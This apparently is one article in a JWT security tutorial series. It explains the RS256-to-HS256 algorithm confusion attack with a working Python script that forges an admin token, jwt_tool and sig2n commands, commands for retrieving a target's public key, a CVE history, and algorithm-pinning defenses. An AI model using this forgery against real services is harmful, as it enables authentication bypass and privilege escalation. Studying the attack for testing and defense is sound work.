---
title: "JWT, Part 4: Algorithm Confusion - public key as password"
date: 2026-03-21T18:03:00+03:00
number: 4
tags: ["jwt", "security", "web", "auth"]
summary: "Take the server's public key from open access, sign a token with it - and the server accepts it. The signature exists, the signature is correct, but the token is forged."
---

**Table of contents:**
- [Symmetric vs asymmetric algorithms](#symmetric-vs-asymmetric-algorithms)
- [How the attack works](#how-the-attack-works)
- [PoC](#poc)
- [Key format - a critically important detail](#key-format---a-critically-important-detail)
- [Where to get the public key](#where-to-get-the-public-key)
- [sig2n: when the public key is unavailable](#sig2n-when-the-public-key-is-unavailable)
- [ES256 is vulnerable too](#es256-is-vulnerable-too)
- [CVE: eleven years of the same bug](#cve-eleven-years-of-the-same-bug)
- [Defense](#defense)
- [What's next](#whats-next)

`alg:none` from the previous article is brute force: "don't verify the signature". Algorithm confusion is more elegant. You take the server's public key (it's publicly available), sign your token with it - and the server accepts it. The signature exists. The signature is correct. But the token is forged.

This is the same fundamental flaw I discussed in the first article: the token dictates the verification algorithm to the server.

## Symmetric vs asymmetric algorithms

Before showing the attack, you need to understand the difference between the two types of algorithms JWT uses.

**HS256 (HMAC-SHA256)** - a symmetric algorithm. The same secret key is used both to create the signature and to verify it. If you know the secret, you can sign any token. That's why the secret must be strong, and that's why HMAC tokens can be brute-forced (more on this in article 7).

**RS256 (RSA-SHA256)** - an asymmetric algorithm. Two keys: the private key signs, the public key verifies. Only the server knows the private key. The public key is public by definition - anyone can see it. Knowing the public key doesn't allow you to forge a signature. At least, it shouldn't.

The key difference: in HS256, one key does everything; in RS256, keys are separated by function. And this is where the problem begins.

## How the attack works

The normal flow with RS256 looks like this:

1. The server signs the JWT with its **private** RSA key
2. The **public** key is used for verification
3. Verification function: `verify(token, public_key)` with the RS256 algorithm

Now the attack. The attacker changes `alg` in the token header from RS256 to HS256. Signs the token using the **server's public key as the HMAC secret**. Sends it to the server.

What does the vulnerable server see? It reads `alg: HS256` from the header. It retrieves the `key` variable for verification - and there sits the public RSA key (because the server is configured for RS256). And passes this key to the HMAC function: `HMAC-SHA256(token_data, public_key)`. The signatures match because the attacker signed the token with the same public key.

```
NORMAL:
verify(token, RSA_public_key) + alg: RS256
= RSA verification with public key. Ok.

ATTACK:
verify(token, RSA_public_key) + alg: HS256
= HMAC verification, public_key as secret
= Attacker also knows public_key
= Signatures match. Token accepted!
```

Why does this happen? Because many libraries use a single `verify(token, key)` function for all algorithms. The `key` variable serves as both an RSA public key and an HMAC secret - depending on the `alg` from the header. One variable, two completely different purposes. The algorithm is chosen by the token, not the server.

## PoC

```python
import hmac, hashlib, base64, json

def b64e(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Server's public key (from JWKS, TLS, documentation)
with open("pubkey.pem") as f:
    pub = f.read()

header = b64e(json.dumps(
    {"alg":"HS256","typ":"JWT"},
    separators=(',',':')).encode())
payload = b64e(json.dumps(
    {"sub":"admin","role":"superuser"},
    separators=(',',':')).encode())

sig_input = f"{header}.{payload}".encode()
sig = hmac.new(pub.encode(), sig_input,
               hashlib.sha256).digest()

print(f"{header}.{payload}.{b64e(sig)}")
```

Or with jwt_tool in a single command:

```bash
python3 jwt_tool.py "$TOKEN" -X k -pk pubkey.pem
```

## Key format - a critically important detail

HMAC operates at the byte level. If the server loads the public key as a PEM string with `-----BEGIN PUBLIC KEY-----`, line breaks, and a trailing `\n`, the attacker must use **exactly the same string**, byte for byte.

Common reasons why a PoC doesn't work:
- PEM without a trailing `\n` (or with an extra one)
- DER format instead of PEM
- Incorrect padding when converting from JWK to PEM
- PKCS#1 format (`BEGIN RSA PUBLIC KEY`) instead of PKCS#8 (`BEGIN PUBLIC KEY`)

jwt_tool automatically tries several formats. For manual exploitation, it's worth trying all variants.

## Where to get the public key

The public key is public by definition, so it's usually openly available.

**JWKS endpoint** - the standard location. Most IdPs (Identity Providers) publish keys at `/.well-known/jwks.json`:

```bash
curl -s https://target/.well-known/jwks.json | python3 -m json.tool
```

The response contains an array of keys. Each key is a JSON with parameters `n` (RSA modulus, Base64url), `e` (exponent, usually `AQAB` = 65537), `kid` (identifier). The PEM file is assembled from `n` and `e`. jwt_tool and other tools handle the conversion automatically.

**OpenID Connect discovery.** Many authorization servers publish their configuration at `/.well-known/openid-configuration`, which contains a `jwks_uri` field with a link to the JWKS:

```bash
curl -s https://target/.well-known/openid-configuration | python3 -c "import json,sys;print(json.load(sys.stdin)['jwks_uri'])"
```

**TLS certificate.** Sometimes JWT is signed with the same key as TLS:

```bash
openssl s_client -connect target:443 2>/dev/null \
  | openssl x509 -pubkey -noout > pubkey.pem
```

It doesn't always match the JWT key, but it's worth trying - it's a free check.

**Other sources:**
- API documentation (Swagger/OpenAPI)
- Mobile app: APK decompilation, searching for PEM/JWK in resources
- Public repositories on GitHub (developers commit keys to code)
- IdP endpoints: `/oauth/certs`, `/oauth/keys`

## sig2n: when the public key is unavailable

Sometimes the key is published nowhere, the TLS certificate doesn't match, there's no documentation. For such cases, PortSwigger created the `sig2n` tool, which **extracts the RSA modulus from two valid tokens** signed by the same key. sig2n only works with RSA algorithms (RS256/RS384/RS512). An RSA signature is the message raised to a power modulo n. Having two tokens with signatures, you can mathematically compute this modulus via GCD (greatest common divisor). This trick doesn't work with ECDSA or HMAC - ECDSA uses a random nonce for each signature, and HMAC has no algebraic structure for such computations.

The math: if we have two messages `m1`, `m2` and their signatures `s1`, `s2`, then `m1^e - s1` and `m2^e - s2` are both divisible by `n` (the RSA modulus). The GCD (greatest common divisor) of these two values gives `n` itself with high probability. From `n` and the standard exponent `e = 65537`, the full public key is reconstructed.

```bash
docker run --rm -it portswigger/sig2n "$JWT1" "$JWT2"
```

The output is one or more public key variants in PEM format and a forged JWT for each variant. You test each one against the server and find the working one.

Getting two tokens is usually easy. Register two accounts, log in - you get two JWTs. Or take two tokens from the same account obtained at different times.

## ES256 is vulnerable too

Algorithm confusion works not only with RSA. If the server uses ES256 (ECDSA - another asymmetric algorithm, which I'll cover in more detail in articles 8 and 9) and the library allows switching to HS256, the EC public key also works as an HMAC secret.

CVE-2024-33663 (python-jose) - exactly this case. The library allowed switching ES256 to HS256 with an EC key. python-jose at the time of writing this series is abandoned with two open CVEs - if you see it in a project's dependencies, that's a red flag.

```bash
python3 jwt_tool.py "$TOKEN" -X k -pk ec_pubkey.pem
```

## CVE: eleven years of the same bug

- **CVE-2015-9235** (jsonwebtoken, Node.js, CVSS 9.8) - first disclosure by Tim McLean
- **CVE-2016-5431** (PHP JOSE Library)
- **CVE-2017-11424** (PyJWT)
- **CVE-2022-29217** (PyJWT - again!)
- **CVE-2024-33663** (python-jose)
- **CVE-2026-22817** (Hono framework, CVSS 8.2) - year 2026

Six CVEs over eleven years. The same attack. Different languages, different libraries, one flaw: the `verify()` function accepts the algorithm from the token instead of server configuration.

## Defense

The only reliable defense is pinning the algorithm on the server side:

```python
# Correct: algorithm set by the server
jwt.decode(token, rsa_key, algorithms=["RS256"])

# Wrong: algorithm taken from the token
jwt.decode(token, key)
```

RFC 8725 Section 3.1 explicitly states: "Each key MUST be used with exactly one algorithm." Each key is bound to one algorithm. Separate code paths for RSA and HMAC. No trust in the `alg` field from the header.

## What's next

In articles 3 and 4, we attacked the `alg` field - the field that controls algorithm selection. But remember the list of header parameters from the second article? `kid`, `jku`, `jwk`, `x5u`, `x5c` - each one is an attack vector. In the next article - kid injection: SQL Injection, path traversal, and command injection via the JWT header parameter.
